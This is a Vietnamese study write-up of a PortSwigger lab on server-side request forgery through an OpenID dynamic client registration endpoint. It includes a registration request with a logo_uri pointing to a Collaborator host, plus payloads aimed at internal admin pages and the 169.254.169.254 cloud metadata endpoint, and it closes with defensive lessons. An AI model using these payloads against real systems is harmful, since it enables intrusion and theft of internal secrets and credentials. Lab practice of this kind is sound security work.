![[openid-ssrf.png]]
-mô tả lab: endpoint OpenID dynamic client registration nhận `logo_uri` URL bừa rồi server tự fetch. Mình trỏ nó vào mạng nội bộ để SSRF. Bài khoai nhất topic OAuth.

> [!NOTE]
> -Lab: https://portswigger.net/web-security/oauth/lab-oauth-ssrf-via-openid-dynamic-client-registration

### hướng giải
- [ ] mình thấy có endpoint `/reg` (dynamic registration) cho đăng ký OAuth client mới bằng JSON, trong đó có trường `logo_uri`
- [ ] mình thử `logo_uri` là URL collaborator, sau đó quan sát collaborator này, mình thấy có HTTP/DNS tới -> server tự fetch logo thật
- [ ] => đây là SSRF. Mình đổi `logo_uri` thành `http://192.168.0.x/admin...` để đánh vào mạng nội bộ / metadata

### giải
-bước 1: mình đăng ký client để confirm SSRF:
```
POST /reg HTTP/1.1
Content-Type: application/json

{"redirect_uris":["https://exploit.net/x"],"logo_uri":"https://COLLAB.oastify.com/logo"}
```
![[openid-collab-hit.png]]
-thấy hit về collaborator là chắc chắn server fetch.

-bước 2: mình quét nội bộ qua `logo_uri` (kết hợp đọc error/response đăng ký, hoặc blind + collaborator exfil):
```
{"logo_uri":"http://192.168.0.1/admin"}
{"logo_uri":"http://169.254.169.254/latest/meta-data/"}
```
-con nào trả về khác (length/time/error) thì mình khoét sâu. Mục tiêu lab thường là đọc được admin interface nội bộ hoặc cloud metadata rồi leo tiếp (vd lấy secret xóa user).

-bước 3: lấy được dữ liệu nhạy cảm (key/secret/internal admin) rồi hoàn thành mục tiêu lab (xóa carlos / vào admin) là solve.

> [!NOTE]
> -bài học của mình: endpoint nào server tự fetch URL user đưa (logo, avatar, webhook, preview) đều phải allowlist + chặn IP nội bộ + tắt redirect. OpenID registration cũng không ngoại lệ.
> -lab này mình làm chậm, vừa quét vừa note, vì blind nên phải kiên nhẫn đọc khác biệt response.
